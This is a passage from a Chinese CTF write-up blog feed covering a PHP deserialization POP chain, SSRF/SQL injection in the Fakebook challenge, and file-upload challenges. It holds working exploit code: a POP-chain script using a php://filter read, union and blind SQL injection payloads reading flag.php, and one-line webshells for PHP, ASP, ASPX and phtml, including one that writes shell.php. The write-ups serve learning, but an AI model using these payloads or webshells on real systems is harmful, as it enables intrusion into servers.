punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面按新手的步骤来，先分开解读一下：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Modifier <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>function append：很明显的 incloud 包含漏洞，可以利用来读 flag</p>\n<p>function __invoke ()：调用 append 读取 flag；invoke 方法在 当一个对象被当做函数调用时，调用该方法。</p>\n<p>思路：让 <code>var=php://filter/read=convert.base64-encode/resource=flag.php</code></p>\n<p>​\t\t\t只要 invoke 被回调就能读取 flag，只需让一个对象被当作函数调用。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Show<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Welcome to '</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>function __construct：通过 file 给 source 赋值；当一个对象被实例化（new）时回调</p>\n<p>function __toString ()：返回 str 中的 source；当一个对象被当做字符串调用或输出时回调</p>\n<p>function __wakeup ()：过滤；在但序列化时自动回调</p>\n<p>思路：这三个方法看着没什么联系，但是却因为先后关系能被链起来。如果让 file 等于一个对象（实例化的 class）</p>\n<p>​\t\t\t那么在反序列化时调用的 wakeup 方法中，就会引起连锁反应（正则匹配会把 source 当成字符串）</p>\n<p>​\t\t\t从而调用了 tostring 方法，返回 str 中的 source</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Test<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>function __construct ()：将变量 p 变成一个数组；调用方法同前面</p>\n<p>function __get ()：调用了一个函数，名字为 function；访问私有属性或不存在的属性时，自动回调</p>\n<p>思路：提示的很明显，在 get 方法中，function 函数被调用</p>\n<p>​\t\t\t所以只要 function 是个对象，就会调用 class Modifier 中的 function __invoke ()，读取 flag</p>\n<p>​\t\t\t要让 function 为对象，只需要让 function __construct () 中的 <code>$this-&gt;p = new Modifier();</code></p>\n<p>​\t\t\t然后只需要 实例化 class Test 且触发__get () 方法 即可获得 flag</p>\n<p>​\t\t\t现在问题是，如何访问一个私有或不存在的属性触发 get？肯定是通过还没使用的 class show</p>\n<p>​\t\t\t根据 class show 中的结果，return 了一个 str 中的 source，那么当 str 被赋值为一个实例化对象后</p>\n<p>​\t\t\t只要该对象没有 source 属性，就可以触发__get () 方法，而刚好 Test 中没有 source。</p>\n<p>​\t\t\t而且让  <code>str = new Test()</code>  还能顺便实例化了 Test 类，同时满足了俩条件</p>\n<p>​\t\t\t至此，这一条链就连起来了！</p>\n<p>总结一下思路：</p>\n<p>​\t\t\t<strong>通过 show 的 __wakeup ()，调用__toString ()，调用 test 的__get ()，调用 Modifier 的__invoke ()</strong></p>\n<p>写代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Modifier <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'php://filter/read=convert.base64-encode/resource=flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>   <span class=\"token comment\">// 为了让 file 成一个对象，而不是一个数据，要调用两次</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 没法直接让 p 等于一个新的对象，需要通过方法来赋值</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fanqie'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 随便赋值，为了让 file 有值，否则会报错警告</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> str <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 让 str 等于一个类</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 再次调用，让 file 赋值成一个对象，触发__tostring ()，开始 pop 链</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 输出编码后的序列化字符串，带入 payload 就行</span></pre></td></tr></table></figure><p>将得到的值通过 get 传入，得到 base64 码，解码得到 flag</p>\n",
            "tags": [
                "反序列化2"
            ]
        },
        {
            "id": "http://example.com/2021/08/04/(ctfwp)ssrf%E5%AD%A6%E4%B9%A0/",
            "url": "http://example.com/2021/08/04/(ctfwp)ssrf%E5%AD%A6%E4%B9%A0/",
            "title": "(ctfwp)ssrf学习",
            "date_published": "2021-08-04T11:17:39.048Z",
            "content_html": "<p>学习一下 ssrf</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1网鼎杯-2018fakebook\"><a class=\"anchor\" href=\"#1网鼎杯-2018fakebook\">#</a> 1.[网鼎杯 2018] Fakebook</h1>\n<hr>\n<p>这题本来没做出来，搜了下 wp，学会了几种方法，并且大致认识了 ssrf。</p>\n<p>下面记录一下：</p>\n<hr>\n<p>进去找了找，发现有 sql 注入漏洞，并且能通过联合查询查到库名表明列名，但是最后显示序列化过的，也没有发现和 flag 相关的东西，遂没有思路了：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvUlNHb1g0YWpsRUpzWjZDLnBuZw==\">https://i.loli.net/2021/08/04/RSGoX4ajlEJsZ6C.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvTlZadTQ3eEZCbk1MR0hiLnBuZw==\">https://i.loli.net/2021/08/04/NVZu47xFBnMLGHb.png</span>&quot; alt=&quot;1.2.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvaE01OUVwWXdpVWFJeXFvLnBuZw==\">https://i.loli.net/2021/08/04/hM59EpYwiUaIyqo.png</span>&quot; alt=&quot;1.3.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>看了 wp 后，发现了这个网站还有 robots.txt 文件，我压根没考虑那么多。。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvTGhBbE9Oems2Q2VzTXJLLnBuZw==\">https://i.loli.net/2021/08/04/LhAlONzk6CesMrK.png</span>&quot; alt=&quot;1.4.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>根据大概意思可以猜测出，应该是 get 了一组信息在 blog 的位置，所以可以把需要 get 的信息写到 blog 位置，应该能出 flag，另外还要注意得用序列化的形式写</p>\n<p>把 txt 中前面的信息复制下来，根据题目中爆出来的文件路径，本地构造序列化内容，用 file 协议读：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvNkc1aG5FdVlmeEJrN0hJLnBuZw==\">https://i.loli.net/2021/08/04/6G5hnEuYfxBk7HI.png</span>&quot; alt=&quot;1.5.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--P5--&gt;</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>no<span class=\"token operator\">=</span><span class=\"token number\">0</span> <span class=\"token comment\">/*!union*/</span> select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:1:\"1\";s:3:\"age\";i:10;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;'</span></pre></td></tr></table></figure><p>在源码中读取 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDQvZTZPem51eFhGRHlhOW9pLnBuZw==\">https://i.loli.net/2021/08/04/e6OznuxXFDya9oi.png</span>&quot; alt=&quot;1.6.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<hr>\n<p>* 其他方法：</p>\n<p>通过 load_file 读取文件获取</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string-interpolation\"><span class=\"token string\">f\"if(ascii(substr((load_file('/var/www/html/flag.php')),</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1))></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1,0)\"</span></span></pre></td></tr></table></figure><p>把 payload 带入盲注二分法程序中跑，能跑出来 flag，原理就是 load_file 能读取本地文件。</p>\n<p>还可以通过 load_file 注入一句话木马，用菜刀链接解：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMzQyMTQxL2FydGljbGUvZGV0YWlscy8xMDMyNTMxMjQ=\">SQL 注入一句话木马（load_file/out file</span></p>\n<hr>\n<p>遇到类似的再补充</p>\n<p>END</p>\n",
            "tags": [
                "SSRF"
            ]
        },
        {
            "id": "http://example.com/2021/08/02/(ctfwp)upload%E7%B1%BB%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E8%BF%90%E7%94%A8/",
            "url": "http://example.com/2021/08/02/(ctfwp)upload%E7%B1%BB%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E8%BF%90%E7%94%A8/",
            "title": "(ctfwp)upload类题目及蚁剑的运用",
            "date_published": "2021-08-02T13:26:51.812Z",
            "content_html": "<p>无聊刷题的时候遇到了点麻烦，经过学习后，认识了下中国蚁剑这款 np 的工具。</p>\n<p>结果没想到又遇到了 upload 类的题目，正好又用到了。。</p>\n<p>晕了，那就写一下，以后方便复习吧。</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<p>先从最简单的写起：</p>\n<h1 id=\"1极客大挑战-2019knife\"><a class=\"anchor\" href=\"#1极客大挑战-2019knife\">#</a> 1.[极客大挑战 2019] Knife</h1>\n<p>进去后就一个界面，再无数尝试后学习了下别人的 wp：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvUFg4cjQ1S0hpbkFnbWtjLnBuZw==\">https://i.loli.net/2021/08/02/PX8r45KHinAgmkc.png</span>&quot; alt=&quot;1.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>现在看来，确实提示的非常明显</p>\n<p>1. 题目为 knife，可以想到 <strong>中国菜刀</strong> 这个软件，他是 <strong>中国蚁剑</strong> 的前辈了。</p>\n<p>2. 中间有很明显得 一句话木马 的代码提示，可惜当时我还不知道。</p>\n<p>折腾半天后用 蚁剑 成功连接上网站，查看目录，flag 在根目录：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvUmhXMkxzR3BBOHdvbktqLnBuZw==\">https://i.loli.net/2021/08/02/RhW2LsGpA8wonKj.png</span>&quot; alt=&quot;2.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<hr>\n<h1 id=\"2actf2020-新生赛upload\"><a class=\"anchor\" href=\"#2actf2020-新生赛upload\">#</a> 2.[ACTF2020 新生赛] Upload</h1>\n<p>这道题稍微多了一点点难度：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvamhRbDRnTVB4WE9xRVI4LnBuZw==\">https://i.loli.net/2021/08/02/jhQl4gMPxXOqER8.png</span>&quot; alt=&quot;3.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>1. 加了上传文件这个功能，查资料后我了解到了这类题的解题方法。</p>\n<p>2. 只能上传图片，无法直接解析代码，不能直接上传 php 来执行，需要绕过。</p>\n<p>3. 要学习一下 一句话木马。</p>\n<p>所以这里先复习一常用的一句话木马（原理、介绍太多就不写了）</p>\n<hr>\n<h2 id=\"一句话木马\"><a class=\"anchor\" href=\"#一句话木马\">#</a> 一句话木马</h2>\n<p>最简单的一句话木马：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php的一句话是:    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code class=\"language-asp\">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;\n</code></pre>\n<pre><code class=\"language-aspx\">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;\n</code></pre>\n<pre><code class=\"language-php+HTML\">phtml的一句话是:  &lt;script language=&quot;php&quot;&gt;eval($_POST['flag']);&lt;/script&gt;\n\t\t\t\t&lt;?php @eval($_POST['flag']);?&gt;\n</code></pre>\n<p>第一个和第四个最常用，实测 [ ] 里面不用引号 ‘ ’ 也行。</p>\n<p>* 如果是图片还可以（我还没试成功过，但是有这个方法）:</p>\n<p>上传一个名字为 wooyun.jpg，内容为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?PHP</span> <span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shell.php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&lt;?php eval($_POST[cmd])?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>的文件，然后访问 